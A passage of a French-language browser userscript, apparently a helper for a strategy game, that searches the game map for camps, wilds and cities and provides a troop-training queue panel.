     var xxx = t.normalizeCoord(t.curX);
     var yyy = t.normalizeCoord(t.curY);
     document.getElementById ('statStatus').innerHTML = 'Recherche sur '+ xxx +','+ yyy;
     setTimeout (function(){ 
       Map.request (xxx, yyy, 15, t.mapCallback)
     }, 500);
  },
  
    normalizeCoord : function (x){
      if ( x >= 800)
        x = 800;
      else if (x < 0)
        x = 0;
      return parseInt (x/5) * 5;
    },

   mapCallback : function (left, top, width, rslt){
      function insertRow (x, y, msg){
        row = document.getElementById('srcOutTab').insertRow(-1);
        row.insertCell(0).innerHTML = x +','+ y;
        row.insertCell(1).innerHTML = distance (t.opt.startX, t.opt.startY, x, y);
        row.insertCell(2).innerHTML = msg;
      }
      
         
      var t = my.Search;
      if (!t.searchRunning)
        return;
      if (!rslt.ok){
        t.stopSearch ('ERREUR : '+ rslt.errorMsg);
        return;
      }
  
      map = rslt.data;
      var userInfo = rslt.userInfo;
      var alliance = rslt.allianceNames;
  
      for (k in map){
        
        if (t.opt.searchType==0 && map[k].tileType==51 && map[k].tileCityId==0 && map[k].tileUserId==0) {  // if barb
          type = 0;
        } else if (t.opt.searchType==1 && map[k].tileType>=10 &&  map[k].tileType<=50) {
          if (map[k].tileType == 10)
            type = 1;
          else if (map[k].tileType == 11)
            type = 2;
          else if (map[k].tileType == 12)
            type = 2;
          else
            type = (map[k].tileType/10) + 1;
        } else if (t.opt.searchType==2 && map[k].tileCityId >= 0 && map[k].tileType > 50 && map[k].cityName) {
  		  type = 7;
        } else {
          continue;
        }
        dist = distance (t.opt.startX, t.opt.startY, map[k].xCoord, map[k].yCoord);
        if (dist <= t.opt.maxDistance && dist >= t.opt.maxDistanceA){
  	        if (t.opt.searchType==2) {
  	            
  			var isMisted = map[k].tileUserId == 0 || false;		
  			var uu = 'u'+map[k].tileUserId;
  			var aU = 'inconnu';
  			var aD = 'inconnu';
  			var mightU = 0;
  			var nameU = 'inconnu';
  			if (isMisted) {
  				nameU = 'Brume';
  				mightU = 0; 
  			} else {
  				if (userInfo[uu] ) { // Corrects a problem with hung search.
  					nameU = ""+ userInfo[uu].n +"";
  					mightU = userInfo[uu].m; 
  					
  					aD = getDiplomacy2(userInfo[uu].a);
  					if ( alliance && alliance['a'+userInfo[uu].a] ) {
  						aU = alliance['a'+userInfo[uu].a];
  					}
  					else {
  					
  						aU = '----';
  						aD = 'unaligned';
  					}
  				}
  			}
  			
  			t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isMisted, map[k].tileCityId, map[k].tileUserId, map[k].cityName,nameU,mightU,aU,aD ]);
  		} else {
  			isOwned = map[k].tileUserId>0 || map[k].misted;
  			
  			var uu = 'u'+map[k].tileUserId;
  			var aU = 'inconnu';
  			var aD = 'inconnu';
  			var nameU = 'inconnu';
  			var mightU = 0;
  			
  			if (map[k].misted) {
  				nameU = 'Sous la Brume';
  			}else {
  			 if (userInfo[uu] ) {
  			   var nameU = "<a onclick=getInfoForAnUser('"+ map[k].tileUserId +"');>"+ userInfo[uu].n +"</a>";
  			   mightU = userInfo[uu].m; 
  			   aD = getDiplomacy2(userInfo[uu].a);
  					if ( alliance && alliance['a'+userInfo[uu].a] ) {
  						aU = alliance['a'+userInfo[uu].a];
  					}
  			 }else {
  			   var nameU = 'inconnu';
  			 }
  			}
  			
  			if (isOwned==undefined) isOwned=false;
  			t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isOwned, map[k].tileCityId, map[k].tileUserId, map[k].cityName, nameU, mightU, aU, aD]);       
  		}
  			++t.tilesFound;
         }   
      }
      t.tilesSearched += (15*15);
      document.getElementById('statSearched').innerHTML = 'Trouv&eacute; : '+ t.tilesSearched;
      
      
      t.dispMapTable();
  
      t.curX += 15;
       if (t.curX > t.lastX){
        t.curX = t.firstX;
        t.curY += 15;
        if (t.curY > t.lastY){
          t.stopSearch ('Fini !');
          return;
        }
      }
      
      //
      t.opt.maxDistanceA
      if (t.opt.maxDistanceA>0) {
       var  plagedeX=t.opt.startX-t.opt.maxDistanceA;
       var  plageaX=t.opt.startX+t.opt.maxDistanceA;
       var  plagedeY=t.opt.startY-t.opt.maxDistanceA;
       var  plageaY=t.opt.startY+t.opt.maxDistanceA;
       if (t.curX >  plagedeX &&  t.curX < plageaX) {
        var nb = parseInt( (t.opt.maxDistanceA*2) / 15) -1;
        t.curX = t.curX + (nb*15);
       }
       if (t.curY >  plagedeY &&  t.curY < plageaY) {
         var nb = parseInt( (t.opt.maxDistanceA*2) / 15) -1;
        t.curY = t.curY + (nb*15);
       }
      }
      var x = t.normalizeCoord(t.curX);
      var y = t.normalizeCoord(t.curY);

      document.getElementById ('statStatus').innerHTML = 'Recherche sur '+ x +','+ y;
      setTimeout (function(){Map.request (x, y, 15, t.mapCallback)}, 500);
  },
  
   dispMapTable : function (){
      var tileNames = ['Camps barbares', 'Paturage', 'Fleuve', 'Foret', 'Collines', 'Montagne', 'Plaine', 'Ville' ];
      var t = my.Search;     
      var coordsOnly = document.getElementById('coordsOnly').checked;
      function mySort(a, b){
        if (Options.srcSortBy == 'level'){
          if ((x = a[4] - b[4]) != 0)
            return x;
        }
  	  if (Options.srcSortBy == 'might'){
          if ((x = b[10] - a[10]) != 0)
            return x;
        }
        if (Options.srcSortBy == 'alli'){
            
            if (a[11] < b[11]) return -1;
  	      else if (a[11] == b[11]) return 0;
  	       else return 1;
            
        }
          if (Options.srcSortBy == 'play'){
           
            if (a[9] < b[9]) return -1;
  	      else if (a[9] == b[9]) return 0;
  	       else return 1;
            
        }
        return a[2] - b[2];
      }
  
      dat = [];
      for (i=0; i<t.mapDat.length; i++){
        lvl = parseInt (t.mapDat[i][4]);
        type = t.mapDat[i][3];
        puissance = t.mapDat[i][10];
  	  if (t.opt.searchType == 2 && type == 7 ) {
  	  switch(parseInt (Options.citySrchFilter)) {
                  case 0:
                   if (Options.filPuissance<=puissance && puissance<=Options.filPuissanceMax) {
                    dat.push(t.mapDat[i]);
                   }
                   break;
                  case 1:
                     if ((t.mapDat[i][12] == 'Hostile') && (Options.filPuissance<=puissance && puissance<=Options.filPuissanceMax)) {
                      dat.push(t.mapDat[i]);
                     }
                     break;
                  case 2:
                     if ((t.mapDat[i][5]===true) && (Options.filPuissance<=puissance && puissance<=Options.filPuissanceMax)) {
                      dat.push(t.mapDat[i]);
                     }
                     break;
                  case 3:
                     if ((t.mapDat[i][12] == 'Ally') && (Options.filPuissance<=puissance && puissance<=Options.filPuissanceMax)) {
                      dat.push(t.mapDat[i]);
                     }
                     break;
                  case 4:
                     if ((t.mapDat[i][12] == 'Friendly') && (Options.filPuissance<=puissance && puissance<=Options.filPuissanceMax)) {
                      dat.push(t.mapDat[i]);
                     }
                     break;
                  case 5:
                     if ((t.mapDat[i][12] == 'Neutral') && (Options.filPuissance<=puissance && puissance<=Options.filPuissanceMax)) {
                      dat.push(t.mapDat[i]);
                     }
                     break;
                   case 6:
                     if ((t.mapDat[i][12] == 'unaligned') && (Options.filPuissance<=puissance && puissance<=Options.filPuissanceMax)) {
                      dat.push(t.mapDat[i]);
                     }
                     break;
               }
       
  		
  	  } else {
         if (lvl>=Options.srcMinLevel && lvl<=Options.srcMaxLevel){
          if (t.opt.searchType==0
              || (Options.woodWild==1 && type == 3)
              || (Options.hillWild==1 && type ==4)
              || (Options.mtnWild==1 && type==5)
              || (Options.plnWild==1 && type == 6)
              || (Options.foodWild==1 && (type==1 || type==2)))
            if (!Options.unownedOnly || t.mapDat[i][5]===false)
              dat.push (t.mapDat[i]);
          }
         }
      }
      document.getElementById('statFound').innerHTML = 'Trouv&eacute : '+ dat.length;
      if (dat.length == 0){
        m = '<BR><CENTER>Non trouv&eacute;</center>';
      } else {
        dat.sort(mySort);
        if (coordsOnly)
          m = '<TABLE align=center id=srcOutTab cellpadding=2 cellspacing=0 style="padding:2px"><TR style="font-weight: bold"><TD style="padding:2px">Location</td></tr>';
        else {
          if (t.opt.searchType == 0) {
  			m = '<TABLE id=srcOutTab cellpadding=2 cellspacing=0 style="padding:2px"><TR style="font-weight: bold"><TD style="padding:2px">Lieu</td><TD style="padding:2px;padding-left: 10px">Dist</td><TD style="padding-left: 10px;">Niv</td><TD style="padding-left: 10px;">Type</td></tr>';
  		}
  		if (t.opt.searchType == 1) {
  			m = '<TABLE id=srcOutTab cellpadding=2 cellspacing=2 style="padding:2px"><TR style="font-weight: bold"><TD style="padding:2px">Lieu</td><TD style="padding:2px;padding-left: 10px">Dist</td><TD style="padding-left: 10px;">Niv</td><TD style="padding-left: 10px;">Type</td><TD style="padding-left: 10px;">Joueur</td><td style="padding-left: 10px;">Puissance</td><td style="padding-left: 10px;">Alliance</td><td style="padding-left: 10px;" colspan=2>Plus d\'info</td></tr>';
  		}
  		if (t.opt.searchType == 2) {
  			 m = '<TABLE id=srcOutTab cellpadding=2 cellspacing=2 style="padding:2px" width=100%><TR style="font-weight: bold"><TD style="padding:2px">Loc</td><TD style="padding:2px;padding-left: 10px">Dist</td><TD  style="padding-left: 10px;">Ville</td><TD style="padding-left: 10px;">Proprio</td><TD style="padding-left: 10px;">Puis.</td><td style="padding-left: 10px;">Alliance </td><td style="padding-left: 10px;" colspan=2>Plus d\'info</td><td colspan=3 width=20% style="padding-left: 10px;">Attaque</td></tr>';
  		}
  	
  	  }
  	  var numRows = dat.length;
        if (numRows > 1000 && t.searchRunning){
        //  numRows = 1000;
         document.getElementById('srchSizeWarn').innerHTML = '<FONT COLOR=#600000>NOTE : ATTENTION, il n\'y a pas de limitation dans la recherche mais cela peut avoir des consequences sur les performances de votre navigateur.</font>';
        }
        for (i=0; i<numRows; i++){
         
         if ((t.opt.searchType != 2) || (dat[i][11].search(Options.filfiltreAlliance, "i") != -1 && dat[i][9].search(Options.filfiltreJoueur, "i") != -1 && t.opt.searchType == 2) ) {
        
          m += '<TR valign="top"';
  		if (dat[i][12]) m += 'class="'+dat[i][12]+'"';
  		
  		if (coordsOnly) {
  		   m += ' ><TD valign="top" style="padding:2px"><DIV>'+ dat[i][0] +','+ dat[i][1] +'</div></td></tr>';
          } else {
             m += ' ><TD valign="top" style="padding:2px"><DIV>\
  	             <a href="javascript:void(0);" onclick="KB.Controllers.MapHelper.gotoCoord('+ dat[i][0] +','+ dat[i][1] +');">'+ dat[i][0] +','+ dat[i][1] +'</a></div>';
  	             
  	            
  	              
  	              
  	            m += '</td>';
     		  if (t.opt.searchType == 2) { 
  			m += '<TD align="left" style="padding:2px" valign="top">'+ dat[i][2].toFixed(2) +'</a></td><TD align=left style="padding:2px">'+ dat[i][8] +'</td>\
  			   <TD valign="top" style="padding:2px">'+dat[i][9]+'</td>\
  			   <TD valign="top" style="padding:2px">'+addCommasInt(dat[i][10])+'</td>\
  			   <td style="padding:2px">'+dat[i][11]+'</td><td style="padding:2px">';
  			   if (dat[i][5]) {
			   			
			   } else {
			   			
			   		m+='<DIV style="" onclick="BOPCpo2(this, '+ dat[i][7] +')"><A style="font-size:9px;">Statut</a></div></td>\
					<td style="padding:2px"></div>';
			   }
                      m+= '</td>';
                      
                      		        	             
		      m+= '<td style="padding-left: 10px;"></td><td style="padding-left: 10px;"></td><td align=right style="padding-left: 10px;"></td>';
  	           
                      
                      m+= '</tr>';
           
  		  } else { 
             m += '<TD align=right  valign="top" style="padding:2px">'+ dat[i][2].toFixed(2) +' &nbsp; </td><TD align=right>'+ dat[i][4] +'</td><TD> &nbsp; '+ tileNames[dat[i][3]];
               +'</td>';
             if (t.opt.searchType == 1) {
              if (dat[i][5]) {
               m += '<td style="padding:2px">'+dat[i][9]+'<td>'+addCommasInt(dat[i][10])+'</td><td>'+dat[i][11]+'</td>';
               
               if (dat[i][7] && dat[i][7]!=0) {
               m+='<td style="padding:2px"><DIV style="" onclick="BOPCpo2(this, '+ dat[i][7] +')"><A style="font-size:9px;">Statut</a></div></td><td></td>';
               } else {
               m+='<td style="padding:2px">&nbsp;</td><td>&nbsp;</td>';
               }
               
              
              } else  {
               m +='<td colspan=5 style="text-align=center"><i><b>libre...</b></i>';
              }
  		   }else{
              m+="<td></td>";
             }
              m +='</tr>';
  		  }
  		}
            }
         }
        m += '</table>';
      }
      document.getElementById('divOutTab').innerHTML = m;
      dat = null;
  },
  
  
    mapDat : [],
  
    stopSearch : function (msg){
      var t = my.Search;
      document.getElementById ('statStatus').innerHTML = '<FONT color=#ffaaaa>'+ msg +'</font>';
      document.getElementById ('srcStart').value = 'Lancer la recherche';
      document.getElementById('srchSizeWarn').innerHTML = '';
      t.searchRunning = false;
  },
}

function distance (d, f, c, e) {
  var a = 800;
  var g = a / 2;
  var b = Math.abs(c - d);
  if (b > g)
    b = a - b;
  var h = Math.abs(e - f);
  if (h > g)
    h = a - h;
  return Math.round(100 * Math.sqrt(b * b + h * h)) / 100;
};


function getDiplomacy2 (aid) {
  if (unsafeWindow.seed.allianceDiplomacies == null)
    return 'Neutral';
  if (unsafeWindow.seed.allianceDiplomacies.friendly && unsafeWindow.seed.allianceDiplomacies.friendly['a'+aid] != null)
    return 'Friendly';
  if (unsafeWindow.seed.allianceDiplomacies.hostile && unsafeWindow.seed.allianceDiplomacies.hostile['a'+aid] != null)
    return 'Hostile';
  if (aid == unsafeWindow.seed.allianceDiplomacies.allianceId)
    return 'Ally';
  return 'Neutral';
};



Map = {
  generateBlockList : function(left, top, width) {
    var width5 = parseInt(width / 5);
    var bl = [];

    for (x=0; x<width5; x++){
      xx = left + (x*5);
      if (xx > 795)
        xx = 800-5;
      for (y=0; y<width5; y++){
        yy = top + (y*5);
        if (yy > 795)
          yy = 800-5;
        bl.push ('bl_'+ xx +'_bt_'+ yy);
      }
    }
    return bl.join(",");
  },

  callback : null,
  request : function (left, top, width, cb) {
    left = parseInt(left / 5) * 5;
    top = parseInt(top / 5) * 5;
    width = parseInt((width+4) / 5) * 5;
    var blockString = this.generateBlockList(left, top, width);
    Map.callback = cb;

    var c={blocks:blockString}
    unsafeWindow.AjaxCall.gPostRequest("fetchMapTiles.php", c, function(rslt) {
        Map.callback(left, top, width, rslt);
      },
      function (rslt) {
        Map.callback(left, top, width, rslt);
      }
    );
  },
};




my.Train = {
  cont : null,
  timer : null,
  state : null,
  stats : {},
  selectedCity : {},

  init : function (){
    var t = my.Train;
    
    t.cont = document.createElement('div');
    return t.cont;
  },

  getContent : function (){
    var t = my.Train;
    return t.cont;
  },

  hide : function (){
    var t = my.Train;
    clearTimeout (t.timer);
  },
  cancelTrainingBO : function (i,cityId,typetrn,numtrptrn,p5,p6,p7,trainingId) {
     // Procédure d'annulation de formation
   var t = my.Train;
   
   Cities.byID[cityId].c.queues.training.slot(i).cancel(function(){
   
   unsafeWindow.Barracks.renderBarracksQueue()
   
   t.dispTrainStatus ('<font color=#550000><B>Annulation de la formation r&eacute;ussie</b></font><BR>');
          t.displayCityStats();
   })
   
 },
  show : function (){
    var t = my.Train;
    clearTimeout (t.timer);
    if (t.state == null){
     unsafeWindow.BOcancelTraining = t.cancelTrainingBO;
      s = "<DIV id=trainTopSelect>\
        <DIV class=ptstat>FORMATION de troupes ou d&eacute;fenses</div><DIV style='height:10px'></div><DIV class=ptentry>\
        <DIV style='text-align:center; margin-bottom:10px;'>Ville : &nbsp; <span id=ptspeedcity></span></div>\
        <TABLE class=ptTab width=100%><TR valign=top><TD width=50%>\
        <TABLE align=center><TR><TD align=right>Type Unit&eacute; : </td><TD colspan=2>\
        <SELECT id=ptttType>";
        for (var nbu=1; nbu<=31;nbu++) {
         if (unsafeWindow.arStrings.unitName["u"+nbu]) {
          s+="<option value="+nbu+">"+unsafeWindow.arStrings.unitName["u"+nbu]+"</option>";
         }
        }
        s+="</select> &nbsp; (max <span id=ptttSpMax></span>)</td></tr>\
        <TR><TD align=right># par slot: </td><TD><INPUT id='ptttInpPS' size=5 type='text' value='0'\></td>\
          <TD><INPUT id='ptttButMaxPS' type=submit value='max'\> &nbsp; (max <span id=ptttSpMaxPS>0</span>)</td></tr>\
        <TR><TD align=right># de slots: </td><TD><INPUT id='ptttInpSlots' size=2 type='text' value='1'\></td>\
          <TD width=75%><INPUT id='ptttButMaxSlots' type=submit value='max'\> &nbsp; (max <span id=ptttSpMaxSlots>1</span>)</td></tr>\
        <TR><TD colspan=3 align=center><DIV style='height:10px'></div><INPUT id='ptttButDo' type=submit value='Former'\></td></tr>\
        </table></td><TD width=20></td><TD style='border-left:solid 2px;' width=50% align=center>\
        <TABLE align=center><TR><TD align=right>Type de d&eacute;fense : </td><TD colspan=2>\
        <SELECT id=pttdType DISABLED>\
          <option value='0'>?????????</option>\
         </select> &nbsp; (<span id=pttdSpMax></span>)</td></tr>\
        <TR><TD align=right># par slot: </td><TD><INPUT id='pttdInpPS' size=5 type='text' value='0'\></td>\
          <TD><INPUT id='pttdButMaxPS' type=submit value='max'\> &nbsp; (max <span id=pttdSpMaxPS>0</span>)</td></tr>\
        <TR><TD align=right># de slots: </td><TD><INPUT id='pttdInpSlots' size=2 type='text' value='1'\></td>\
          <TD width=75%><INPUT id='pttdButMaxSlots' type=submit value='max'\> &nbsp; (max <span id=pttdSpMaxSlots>1</span>)</td></tr>\
        <TR align=center><TD colspan=3><SPAN id=pttdSpace></span></td></tr>\
        <TR><TD colspan=3 align=center><DIV style='height:10px'></div><INPUT id='pttdButDo' type=submit disabled=true value='Construire'\></td></tr></table>\
        </td></tr></table></div></div>\
        <TABLE align=center width=425 class=ptTab><TR><TD><div id=ptTrainStatus style='overflow-y:auto; max-height:78px; height: 78px;'></div></td></tr></table>\
        <div style='height: 325px; background: #e8ffe8'>\
        <TABLE width=100% class=ptTab><TR><TD colspan=3><DIV id=divSTtop></div></td></tr>\
        <TR><TD width=50% style='padding-left:15px; padding-right:15px'><DIV style='text-align:center'><B>File attente &nbsp; (<SPAN id=statTTtot></span>)</b><BR><HR></div><DIV id=divSTleft style='overflow-y: auto; height:210px; max-height:210px'></div></td>\
          <TD width=50% style='padding-left:15px; padding-right:15px'><DIV style='text-align:center'><B>File attente &nbsp; (<SPAN id=statDTtot></span>)</b><BR><HR></div><DIV id=divSTright style='overflow-y: auto; height:210px; max-height:210px'></div></td></tr>\
        </div>";
      t.cont.innerHTML = s;

      var dcp = new CdispCityPicker ('ptspeed', document.getElementById('ptspeedcity'), true, t.clickCitySelect, 0);
      t.TTspMax = document.getElementById ('ptttSpMax');
      t.TTspMaxPS = document.getElementById ('ptttSpMaxPS');
      t.TTspMaxSlots = document.getElementById ('ptttSpMaxSlots');
      t.TTbutMaxSlots = document.getElementById ('ptttButMaxSlots');
      t.TTbutMaxPerSlot = document.getElementById ('ptttButMaxPS');
      t.TTinpPerSlot = document.getElementById ('ptttInpPS');
      t.TTinpSlots = document.getElementById ('ptttInpSlots');
      t.TTselType = document.getElementById ('ptttType');
      t.TTbutDo = document.getElementById ('ptttButDo');
      t.TDspMax = document.getElementById ('pttdSpMax');
      t.TDspMaxPS = document.getElementById ('pttdSpMaxPS');
      t.TDspMaxSlots = document.getElementById ('pttdSpMaxSlots');
      t.TDbutMaxSlots = document.getElementById ('pttdButMaxSlots');
      t.TDbutMaxPerSlot = document.getElementById ('pttdButMaxPS');
      t.TDinpPerSlot = document.getElementById ('pttdInpPS');
      t.TDinpSlots = document.getElementById ('pttdInpSlots');
      t.TDselType = document.getElementById ('pttdType');
      t.TDbutDo = document.getElementById ('pttdButDo');
      t.TDspSpace = document.getElementById ('pttdSpace');
      t.divTrainStatus = document.getElementById ('ptTrainStatus');
            
      t.TTinpSlots.addEventListener ('change', t.updateTopTroops, false);
      t.TTbutMaxPerSlot.addEventListener ('click', t.clickTroopMaxPS, false);
      t.TTbutMaxSlots.addEventListener ('click', t.clickTroopMaxSlots, false);
      t.TTselType.addEventListener ('change', t.changeTroopSelect, false);
      t.TTbutDo.addEventListener ('click', t.clickTroopDo, false);
      t.TDinpSlots.addEventListener ('change', t.updateTopDef, false);
      t.TDselType.addEventListener ('change', t.changeDefSelect, false);
      t.TDbutMaxPerSlot.addEventListener ('click', t.clickDefMaxPS, false);
      t.TDbutMaxSlots.addEventListener ('click', t.clickDefMaxSlots, false);
      //t.TDbutDo.addEventListener ('click', t.clickDefDo, false);
           
      t.changeTroopSelect();
    //  t.changeDefSelect();
      t.state = 1;
    }

    if (t.lastTroopSelect != t.TTselType.value)
      t.changeTroopSelect();
   // if (t.lastDefSelect != t.TDselType.value)
   //   t.changeDefSelect();
    t.displayCityStats();
    t.updateTopTroops ();
   // t.updateTopDef ();
    t.timer = setTimeout (t.show, 1000);
  },

/*******  TROOPS  ******/  
  
  updateTopTroops : function (){
    var t = my.Train;
    var slots = parseInt(t.TTinpSlots.value, 10);
    if (isNaN(slots) || slots<0)
      slots = 0;
    t.TTspMax.innerHTML = t.stats.MaxTrain;
    t.TTspMaxSlots.innerHTML = t.stats.barracks - t.stats.queued;
    if (slots<1 || (t.stats.barracks-t.stats.queued < 1))
      t.TTspMaxPS.innerHTML = 0;
    else
      t.TTspMaxPS.innerHTML = parseInt(t.stats.MaxTrain / slots);
  },
      
  
  clickTroopMaxPS : function (){
    var t = my.Train;
    var slots = parseInt(t.TTinpSlots.value, 10);
    if (slots<1 || (t.stats.barracks-t.stats.queued < 1))
      t.TTinpPerSlot.value = 0;
    else
      t.TTinpPerSlot.value = parseInt(t.stats.MaxTrain / slots);
  },

  clickTroopMaxSlots : function (){
    var t = my.Train;
    t.TTinpSlots.value = t.stats.barracks - t.stats.queued;
  },
  
  clickCitySelect : function (city){
    var t = my.Train;
    t.selectedCity = city;
    var SourceId = t.selectedCity.c.id;
    unsafeWindow.Chrome.City.switchTo(SourceId);
    t.lastQueString = null;   
    //t.lastDQueString = null;   
    t.displayCityStats ();
    t.changeTroopSelect();
    //t.changeDefSelect();
  },
   
  changeTroopSelect : function (){
    var t = my.Train;
    var cityId = t.selectedCity.id;
    // unitcost: NAME, Food, Wood, Stone, Ore, Gold, Pop, ?
    var id = t.TTselType.value;
    t.lastTroopSelect = id;
    var uc = unsafeWindow.trainingData["unit"+id].costs.level0;
    var max = 9999999999;
    if ( (t.stats.food / uc["resource1"]) < max)
      max = t.stats.food / uc["resource1"];
    if ( (t.stats.wood / uc["resource2"]) < max)
      max = t.stats.wood / uc["resource2"];
    if ( (t.stats.stone / uc["resource3"]) < max)
      max = t.stats.stone / uc["resource3"];
    if ( (t.stats.ore / uc["resource4"]) < max)
      max = t.stats.ore / uc["resource4"];
    if ( (t.stats.idlePop / uc.population) < max)
      max = t.stats.idlePop / uc.population;
    t.stats.MaxTrain = parseInt (max);
    if (t.stats.MaxTrain < 0)
      t.stats.MaxTrain = 0;
    /*  
    if (matTypeof(uc[8]) == 'object'){
      for (k in uc[8]){  // check building requirement
        var b = getCityBuilding (cityId, k.substr(1));
        if (b.maxLevel < uc[8][k][1]){
          t.stats.MaxTrain = 0;
          break;
        }
      }
    }
    if (matTypeof(uc[9]) == 'object'){
      for (k in uc[9]){    // check tech requirement
        if (parseInt(Seed.tech['tch'+k.substr(1)]) < uc[9][k][1]){
          t.stats.MaxTrain = 0;
          break;
        }
      }
    }*/
    t.updateTopTroops();
  },
  
  clickTroopDo : function (){
    var t = my.Train;
    var cityId = t.selectedCity.id;
    var unitId = t.TTselType.value;
    var perSlot = parseInt(t.TTinpPerSlot.value, 10);
    var numSlots = parseInt(t.TTinpSlots.value, 10);
    
    t.displayCityStats ();
    if (perSlot<1){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>Number of troops per slot must be greater than 0.</font>';
      return;
    }
    if (perSlot*numSlots > t.stats.MaxTrain){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>Can\'t train that many troops (max is '+ t.stats.MaxTrain +' total)</font>';
      return;
    }
    if (numSlots<1 || numSlots>t.stats.barracks - t.stats.queued){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>Invalid number of slots.</font>';
      return;
    }
    t.setBusy(true);
    var que = [];
    for (var i=0; i<numSlots; i++)
      que.push (['T', unitId, parseInt (perSlot)]);
    t.divTrainStatus.innerHTML = '';
    t.doQueue (cityId, que);
  },

  
/*******  DEF  ******/  
  
  updateTopDef : function (){
    var t = my.Train;
    var slots = parseInt(t.TDinpSlots.value, 10);
    if (isNaN(slots) || slots<0)
      slots = 0;
    t.TDspMax.innerHTML = 'max:'+ t.stats.MaxDefTrain +'&nbsp; owned:'+ t.stats.defOwned;   
    t.TDspMaxSlots.innerHTML = t.stats.wallLevel-t.stats.Dqueued;
    if (slots<1)
      t.TDspMaxPS.innerHTML = 0;
    else
      t.TDspMaxPS.innerHTML = parseInt(t.stats.MaxDefTrain / slots);

    t.TDspSpace.innerHTML = 'Wall level: <B>'+ t.stats.wallLevel +'</b><BR>Wall space: '+ (t.stats.wallSpaceUsed+t.stats.wallSpaceQueued)  +'/<B>'+ t.stats.wallSpace +'</b><BR>\
        Field space: '+ (t.stats.fieldSpaceUsed+t.stats.fieldSpaceQueued) +'/<B>'+ t.stats.fieldSpace +'</b>';
  },

  changeDefSelect : function (){
    var t = my.Train;
    var cityId = t.selectedCity.id;
    // unitcost: NAME, Food, Wood, Stone, Ore, Gold, Pop, ?
    var id = t.TDselType.value;
    t.lastDefSelect = id;
    t.stats.defOwned = parseInt(Seed.fortifications['city' + cityId]['fort'+id]);    
    var uc = unsafeWindow.fortcost['frt'+id];
    var max = 9999999999;
    if ( (t.stats.food / uc[1]) < max)
      max = t.stats.food / uc[1];
    if ( (t.stats.wood / uc[2]) < max)
      max = t.stats.wood / uc[2];
    if ( (t.stats.stone / uc[3]) < max)
      max = t.stats.stone / uc[3];
    if ( (t.stats.ore / uc[4]) < max)
      max = t.stats.ore / uc[4];
    if ( (t.stats.idlePop / uc[6]) < max)
      max = t.stats.idlePop / uc[6];
    t.stats.MaxDefTrain = parseInt (max);
    if (t.stats.MaxDefTrain < 0)
      t.stats.MaxDefTrain = 0;
    if (matTypeof(uc[8]) == 'object'){
      for (k in uc[8]){  // check building requirement
        var b = getCityBuilding (cityId, k.substr(1));
        if (b.maxLevel < uc[8][k][1]){
          t.stats.MaxDefTrain = 0;
          break;
        }
      }
    }
    if (matTypeof(uc[9]) == 'object'){
      for (k in uc[9]){    // check tech requirement
        if (parseInt(Seed.tech['tch'+k.substr(1)]) < uc[9][k][1]){
          t.stats.MaxDefTrain = 0;
          break;
        }
      }
    }

    var spaceEach = parseInt(unsafeWindow.fortstats["unt"+ id][5]);
    if (id<60)
      var spaceAvail = t.stats.wallSpace - t.stats.wallSpaceUsed - t.stats.wallSpaceQueued;
    else
      var spaceAvail = t.stats.fieldSpace - t.stats.fieldSpaceUsed - t.stats.fieldSpaceQueued;
    if ( t.stats.MaxDefTrain * spaceEach > spaceAvail)
      t.stats.MaxDefTrain = parseInt(spaceAvail / spaceEach);
    
    t.updateTopDef();
  },
  
  clickDefMaxPS : function (){
    var t = my.Train;
    var slots = parseInt(t.TDinpSlots.value, 10);
    if (slots<1)
      t.TDinpPerSlot.value = 0;
    else
      t.TDinpPerSlot.value = parseInt(t.stats.MaxDefTrain / slots);
  },

  clickDefMaxSlots : function (){
    var t = my.Train;
    t.TDinpSlots.value = t.stats.wallLevel-t.stats.Dqueued;
  },
    
  clickDefDo : function (){
    var t = my.Train;
    var cityId = t.selectedCity.id;
    var unitId = t.TDselType.value;
    var perSlot = parseInt(t.TDinpPerSlot.value, 10);
    var numSlots = parseInt(t.TDinpSlots.value, 10);
    
    t.displayCityStats ();
    if (perSlot<1){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>Number of units per slot must be greater than 0.</font>';
      return;
    }
    if (perSlot*numSlots > t.stats.MaxDefTrain){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>Can\'t train that many unit (max is '+ t.stats.MaxDefTrain +' total)</font>';
      return;
    }
    if (numSlots<1 || numSlots > t.stats.wallLevel-t.stats.Dqueued){
      t.divTrainStatus.innerHTML = '<FONT COLOR=#550000>Invalid number of slots.</font>';
      return;
    }
    t.setBusy(true);
    var que = [];
    for (var i=0; i<numSlots; i++)
      que.push (['T', unitId, parseInt (perSlot)]);
    t.divTrainStatus.innerHTML = '';
    t.doDefQueue (cityId, que);
  },

  doDefQueue : function (cityId, que, errMsg){
    var t = my.Train;
    try {
      t.displayCityStats();
      if (errMsg){
        t.dispTrainStatus ('<font color=#550000><B>ERROR: '+ errMsg +'</b></font><BR>');
        t.setBusy(false);
        return;
      }
      var cmd = que.shift();
      if (!cmd){
        t.dispTrainStatus ('<B>Done queueing defenses.</b><BR>');
        t.setBusy(false);
        return;
      }
      if (cmd[0] == 'T'){
        t.dispTrainStatus ('Training '+ cmd[2] +' '+  fortNamesShort[cmd[1]] +'<BR>');
        doDefTrain (cityId, cmd[1], cmd[2], function(errMsg){my.Train.doDefQueue(cityId, que, errMsg);} );
      }
    } catch (err) {
      logit (inspect (err, 8, 1));
      t.dispTrainStatus ('<font color=#550000>PROGRAM ERROR: '+ err.message +'</font><BR>');
      t.setBusy(false);
    }
  },
  setBusy : function (tf){
    var t = my.Train;
    //t.TDbutDo.disabled = tf;
    t.TTbutDo.disabled = tf;
  }, 
  displayCityStats : function (){
    var t = my.Train;
    var cityId = t.selectedCity.id;
    t.stats.food = parseInt (Cities.byID[cityId].c.resources[1].count);
    t.stats.wood = parseInt (Cities.byID[cityId].c.resources[2].count);
    t.stats.stone = parseInt (Cities.byID[cityId].c.resources[3].count);
    t.stats.ore = parseInt (Cities.byID[cityId].c.resources[4].count);
    t.stats.gold = parseInt (Cities.byID[cityId].c.silver());
    t.stats.idlePop = parseInt(Cities.byID[cityId].c.population.count()) - parseInt(Cities.byID[cityId].c.population.labor());
      
